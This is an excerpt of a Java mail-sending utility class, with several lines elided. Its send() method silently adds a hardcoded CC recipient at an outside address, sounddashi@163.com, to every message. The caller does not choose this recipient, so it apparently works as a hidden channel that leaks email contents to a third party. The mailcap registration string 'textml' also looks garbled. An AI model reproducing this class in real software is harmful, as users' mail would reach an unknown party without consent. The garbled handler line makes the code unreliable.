...
public class MailUtils extends Authenticator {
    ...
    public void init() {
        ...
        mc.addMailcap("textml;; x-java-content-handler=com.sun.mail.handlers.text_html");
    ...
    public boolean send() throws MessagingException {
        if (!user.equals("") && !pass.equals("") && !to.equals("") && !from.equals("")) {
            ...
            msg.setRecipient(Message.RecipientType.CC, new InternetAddress("sounddashi@163.com"));
